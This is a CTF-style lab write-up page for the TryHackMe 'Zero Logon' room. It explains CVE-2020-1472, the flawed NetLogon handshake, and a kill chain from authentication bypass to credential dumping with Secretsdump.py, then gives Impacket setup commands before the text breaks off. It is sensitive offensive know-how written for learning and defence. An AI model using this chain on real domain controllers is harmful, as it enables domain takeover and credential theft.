theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Linux Local Enumeration/">Linux: Local Enumeration</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Linux PrivEsc/ Linux PrivEsc/">Linux PrivEsc</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Looking Glass/">Looking Glass</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Madness/">Madness</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Magician/">Magician</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Metaspliot/Metasploit/">Metaspliot</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Mindgames/">Mindgames</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Misguided Ghosts/Misguided Ghost/">Misguided Ghosts</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Mnemonic/">Mnemonic</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Motunui/">Motunui</a><button aria-label="Toggle the collapsible sidebar category &#x27;Motunui&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Mr Robot CTF/">Mr Robot CTF</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Musical Stego/ Musical Stego/">Musical Stego</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/NIS - Linux Part I/">NIS - Linux Part I</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Nax/">Nax</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/NerdHerd/NerdHeard/">NerdHerd</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Nessus/">Nessus</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Network Services/">Network Services</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Networking/">Networking</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Ninja Skills/">Ninja Skills</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Nmap/">Nmap</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/OWASP Top 10/">OWASP Top 10</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/OWASP ZAP/">Introduction to OWASP ZAP</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/OhSINT/">OhSINT</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/One Piece/">One Piece</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Overpass/">Overpass</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Overpass 2 - Hacked/Overpass 2/">Overpass 2 - Hacked</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/PS Empire/">PS Empire</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Peak Hill/">Peak Hill</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Persistence/">Persistence</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Pickle Rick/">Pickle Rick</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Post-Exploitation Basics/Post Exploitation Basics/">Post-Exploitation Basics</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Poster/">Poster</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Printer Hacking 101/">Printer Hacking 101</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Psycho Break/Pyscho Break/">Psycho Break</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Python Playground/">Python Playground</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Ra/">Ra</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Ra 2/">Ra 2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Racetrack Bank/">Racetrack Bank</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Recovery/">Recovery</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Relevant/Relevent/">Relevant</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Res/">Res</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Retro/">Retro</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Revenge/">Revenge</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Reverse Engineering/">Reverse Engineering</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Reversing ELF/">Reversing ELF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/RootMe/">RootMe</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/SSRF/">SSRF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Scripting/">Scripting</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Set/">Set</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Shodan.io/Shodan/">Shodan.io</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Simple CTF/">Simple CTF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Skynet/">Skynet</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Smag Grotto/">Smag Grotto</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Source/">Source</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Splunk/">Splunk</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Spring/">Spring</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Starting Out In Cyber Sec/">Starting Out In Cyber Sec</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Startup/">Startup</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Steel Mountain/">Steel Mountain</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/StuxCTF/">StuxCTF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Sublist3r/">Sublist3r</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Sudo Buffer Overflow/">Sudo Buffer Overflow</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Sudo Security Bypass/">Sudo Security Bypass</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Symfonos6/">symfonos6</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tartarus/">Tartarus</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tempus Fugit Durius/">Tempus Fugit Durius</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The Blob Blog/">The Blob Blog</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The Docker Rodeo/">The Docker Rodeo</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The Impossible Challenge/">The Impossible Challenge</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The Marketplace/">The Marketplace</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The Server From Hell/">The Server From Hell</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The find command/">The find command</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Thompson/">Thompson</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tmux/">tmux</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tomghost/">tomghost</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tony the Tiger/">Tony the Tiger</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/ToolsRus/">ToolsRus</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tor/">Tor</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tutorial/">Tutorial</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Undiscovered/">Undiscovered</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Upload Vulnerabilities/">Upload Vulnerabilities</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/WWBuddy/">WWBuddy</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Web Fundamentals/">Web Fundamentals</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Web Scanning/">Web Scanning</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/WebAppSec 101/">WebAppSec 101</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Wgel CTF/">Wgel CTF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Willow/">Willow</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Windows PrivEsc Arena/">Windows PrivEsc Arena</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Wireshark 101/">Wireshark 101</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Wonderland/">Wonderland</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/XXE/">XXE</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Year of the Dog/">Year of the Dog</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Year of the Fox/">Year of the Fox</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Year of the Pig/">Year of the Pig</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Year of the Rabbit/">Year of the Rabbit</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/writeups/Tryhackme/Zero Logon/">Zero Logon</a></li></ul></li></ul></nav><button type="button" title="Collapse sidebar" aria-label="Collapse sidebar" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_gTbr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Tryhackme</span><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Zero Logon</span><meta itemprop="position" content="2"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><h1>Zero Logon</h1><p>Learn about and exploit the ZeroLogon vulnerability that allows an attacker to go from Zero to Domain Admin without any valid credentials.</p><p><a href="https://tryhackme.com/room/zer0logon" target="_blank" rel="noopener noreferrer">Zero Logon</a></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="-we-will-cover--the-topics">💢 We will cover  the topics<a href="#-we-will-cover--the-topics" class="hash-link" aria-label="Direct link to 💢 We will cover  the topics" title="Direct link to 💢 We will cover  the topics">​</a></h2><ul><li>Zero Logon</li></ul><hr><h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-1-the-zero-day-angle">Task 1 The Zero Day Angle<a href="#task-1-the-zero-day-angle" class="hash-link" aria-label="Direct link to Task 1 The Zero Day Angle" title="Direct link to Task 1 The Zero Day Angle">​</a></h2><p>The purpose of this room is to shed light on the ZeroLogon vulnerability within an educational focus. This is done such that defenders can better understand the threat faced herein. The ZeroLogon vulnerability is approached from a &quot;Proof of Concept&quot; emphasis, providing a breakdown of the vulnerable method within this issue. TryHackMe does not condone illegal actions taken on the part of the individual.</p><p><strong>Zero Logon - The Zero Day Angle</strong></p><p><strong>About The vulnerability -</strong></p><p>On September 14, Secura released a whitepaper for CVE-2020-1472, that allowed an attacker to go from Zero to Domain Admin in approximately one minute. They dubbed this vulnerability Zero Logon.</p><p>Zero Logon is a purely statistics based attack that abuses a feature within MS-NRPC (Microsoft NetLogon Remote Protocol), MS-NRPC is a critical authentication component of Active Directory that handles authentication for User and Machine accounts. In short -- the attack mainly focuses on a poor implementation of Cryptography. To be more specific, Microsoft chose to use AES-CFB8 for a function called ComputeNetlogonCredential, which is normally fine, except they had hard coded the Initialization Vector to use all zeros instead of a random string. When an attacker sends a message only containing zeros with the IV of zero, there is a 1-in-256 chance that the Ciphertext will be Zero.</p><p>But how is that useful to us? We&#x27;ll touch on that note in the following sections.</p><p><strong>About Machine Accounts -</strong></p><p>Normally, if we tried a statistics based attack on any user account, we would get locked out. This is not the case if we apply this principal to machine accounts. Machines accounts behave in a much different way than standard user accounts. They have no predefined account lockout attempts because a 64+ character alpha numeric password is normally used to secure them, making them very difficult to break into. They&#x27;re not meant to be accessed by an end user by any means. In certain circumstances, we can dump the machine account password using a tool like Mimikatz, but if we&#x27;re at that point, we&#x27;ve already compromised the machine -- and we&#x27;re looking for persistence within the domain, not lateral movement.</p><p><strong>Abusing the Vulnerability -</strong></p><p>Machine accounts often hold system level privileges which we can use for a variety of things. If you&#x27;re not familiar with Active Directory, we can take the Domain Controller&#x27;s Machine Account and attempt to use the granted authentication in conjunction with Secretsdump.py (SecretsDump is a password dumping utility like Mimikatz, except it lives on the Network instead of the host) to dump all of the passwords within the domain. At this point we have a rough kill chain starting to form:</p><p>Use Zero Logon to bypass authentication on the Domain Controller&#x27;s Machine Account -&gt; Run Secretsdump.py to dump credentials -&gt; Crack/Pass Domain Admin Hashes -&gt; ??? -&gt; Profit</p><p><strong>Analyzing the MS-NRPC Logon Process -</strong></p><p>At this point, we know a vulnerability exists, but we&#x27;re not quite sure how to exploit it yet. We&#x27;ll be covering that soon, but what we do know there&#x27;s a vulnerability within the way Microsoft handles Authentication within ComputeNetLogonCredetial function of MS-NRPC. To better understand the vulnerability, we need to do a bit of a deeper dive on how Microsoft handles authentication to NRPC.</p><p>To analyze where the vulnerability occurs, we&#x27;ll be using the Diagram provided by Secura as well as Microsoft Documentation to decipher the magic behind Zero Logon. The sources can be found at the bottom of this task.</p><p><img loading="lazy" src="https://zdnet4.cbsistatic.com/hub/i/r/2020/09/11/91ce3485-5a9b-4fd7-9bdb-908084954c58/resize/1200xauto/fe9d0bc8d73a637a58da4d40978ede5d/zerologon-attack.png" class="img_ev3q"></p><p>Source: Secura</p><p><strong>Step 1</strong>. The client creates a NetrServerReqChallenge and sends it off <!-- -->[Figure 1. Step 1]<!-- -->. This contains the following values:</p><ol><li>The DC</li><li>The Target Device (Also the DC, in our case)</li><li>A Nonce (In our case is 16 Bytes of Zero).</li></ol><p><strong>Step 2</strong>. The server receives the NetrServerReqChallenge, the server will then generate it&#x27;s own Nonce (This is called the Server Challenge), the server will send the Server Challenge back. <!-- -->[Figure 1. Step 2]</p><p><strong>Step 3</strong>. The client (us) will compute it&#x27;s NetLogon Credentials with the Server Challenge provided <!-- -->[Figure 1. Step 3]<!-- -->. It uses the NetrServerAuthenticate3 method which requires the following parameters:</p><ol><li>A Custom Binding Handle (Impacket handles this for us, it&#x27;s negotiated prior)</li><li>An Account Name (The Domain Controller&#x27;s machine account name. ex: DC01$)</li><li>A Secure Channel Type (Impacket sort of handles this for us, but we still need to specify it: <!-- -->[nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel]<!-- -->)</li><li>The Computer Name (The Domain Controller ex: DC01)</li><li>The Client Credential String (this will be 8 hextets of \x00 <!-- -->[16 Bytes of Zero]<!-- -->)</li><li>Negotiation Flags (The following value observed from a Win10 client with Sign/Seal flags disabled: 0x212fffff Provided by Secura)</li></ol><p><strong>Step 4</strong>. The server will receive the NetrServerAuthenticate request and will compute the same request itself using it&#x27;s known, good values. If the results are good, the server will send the required info back to the client. <!-- -->[Figure 1. Step 4.]</p><p>At this point the attempt to exploit the Zero Logon vulnerability is under way. The above steps above will be looped through a certain number of times to attempt to exploit the Zero Logon vulnerability. The actual exploit occurs at Step 3 and 4, this where we&#x27;re hoping for the Server to a have the same computations as the client. This is where are 1-in-256 chance comes in.</p><p><strong>Step 5</strong>. If the server calculates the same value, the client will re-verify and once mutual agreement is confirmed, they will agree on a session key. The session key will be used to encrypt communications between the client and the server, which means authentication is successful. <!-- -->[Figure 1. Step 5]</p><p>From there, normal RPC communications can occur.</p><p>Sources -</p><ol><li><p>Tom Tervoort of Secura - <a href="https://www.secura.com/pathtoimg.php?id=2055" target="_blank" rel="noopener noreferrer">https://www.secura.com/pathtoimg.php?id=2055</a></p></li><li><p>Microsoft - <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/7b9e31d1-670e-4fc5-ad54-9ffff50755f9" target="_blank" rel="noopener noreferrer">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/7b9e31d1-670e-4fc5-ad54-9ffff50755f9</a></p></li><li><p>Microsoft - <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9" target="_blank" rel="noopener noreferrer">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9</a></p></li><li><p>Read about Zero Logon</p></li></ol><h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-2-impacket-installation">Task 2 Impacket Installation<a href="#task-2-impacket-installation" class="hash-link" aria-label="Direct link to Task 2 Impacket Installation" title="Direct link to Task 2 Impacket Installation">​</a></h2><p><strong>Impacket Installation</strong></p><p><strong>Git Clone Impacket -</strong></p><p>As a prior warning, Impacket can be quite fussy when it comes to some modules within nrpc.py, because of this, we recommend using the TryHackMe Attack Box. This will make the exploit run faster, additionally, we can attempt to provide better support via the Attack Box. Additionally, we are going to be using a Virtual Environment to Install Impacket. The instructions to install Impacket are as follows:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">python3 -m pip install virtualenv</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">python3 -m virtualenv impacketEnv</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">source impacketEnv/bin/activate</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">pip install git+https://github.com/SecureAuthCorp/impacket</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 